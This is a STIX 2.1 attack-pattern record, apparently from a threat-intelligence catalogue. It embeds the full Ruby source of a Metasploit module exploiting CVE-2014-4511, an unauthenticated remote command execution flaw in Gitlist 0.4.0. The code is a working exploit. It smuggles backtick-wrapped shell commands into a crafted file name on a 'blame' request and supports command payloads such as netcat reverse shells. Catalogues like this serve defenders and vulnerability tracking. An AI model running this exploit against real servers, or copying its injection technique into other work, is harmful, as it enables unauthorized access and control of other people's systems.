{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5b8d4889-c008-4e35-b2cd-9c82a2e69f0a",
    "created": "2024-08-14T17:01:34.094301Z",
    "modified": "2024-08-14T17:01:34.094308Z",
    "name": "Gitlist Unauthenticated Remote Command Execution",
    "description": " This module exploits an unauthenticated remote command execution vulnerability in version 0.4.0 of Gitlist. The problem exists in the handling of a specially crafted file name when trying to blame it.  'License'        => MSF_LICENSE 'Privileged'     => false 'Platform'       => 'unix' 'Arch'           => ARCH_CMD",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/gitlist_exec.rb",
            "external_id": "gitlist_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-4511"
        },
        {
            "source_name": "reference",
            "url": "http://hatriot.github.io/blog/2014/06/29/gitlist-rce/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Gitlist Unauthenticated Remote Command Execution',\n      'Description'    => %q{\n          This module exploits an unauthenticated remote command execution vulnerability\n        in version 0.4.0 of Gitlist. The problem exists in the handling of a specially\n        crafted file name when trying to blame it.\n      },\n      'License'        => MSF_LICENSE,\n      'Privileged'     => false,\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Author'         =>\n        [\n          'drone', #discovery/poc by @dronesec\n          'Brandon Perry <bperry.volatile[at]gmail.com>' #Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2014-4511'],\n          ['EDB', '33929'],\n          ['URL', 'http://hatriot.github.io/blog/2014/06/29/gitlist-rce/']\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 8192, # max length of GET request really\n          'BadChars'    => \"&\\x20\",\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic telnet python perl gawk netcat netcat-e ruby php openssl',\n            }\n        },\n      'Targets'        =>\n        [\n          ['Gitlist 0.4.0', { }]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-06-30'\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI of the vulnerable instance', '/'])\n      ])\n  end\n\n  def check\n    repo = get_repo\n\n    if repo.nil?\n      return Exploit::CheckCode::Unknown\n    end\n\n    chk = Rex::Text.encode_base64(rand_text_alpha(rand(32)+5))\n\n    res = send_command(repo, \"echo${IFS}\" + chk + \"|base64${IFS}--decode\")\n\n    if res && res.body\n      if res.body.include?(Rex::Text.decode_base64(chk))\n        return Exploit::CheckCode::Vulnerable\n      elsif res.body.to_s =~ /sh.*not found/\n        return Exploit::CheckCode::Vulnerable\n      end\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    repo = get_repo\n    if repo.nil?\n      fail_with(Failure::Unknown, \"#{peer} - Failed to retrieve the remote repository\")\n    end\n    send_command(repo, payload.encoded)\n  end\n\n  def get_repo\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, \"/\")\n    })\n\n    unless res\n      return nil\n    end\n\n    first_repo = /href=\"\\/gitlist\\/(.*)\\/\"/.match(res.body)\n\n    unless first_repo && first_repo.length >= 2\n      return nil\n    end\n\n    repo_name = first_repo[1]\n\n    repo_name\n  end\n\n  def send_command(repo, cmd)\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, repo, 'blame', 'master', '\"\"`' + cmd + '`')\n    }, 1)\n\n    res\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-06-30"
}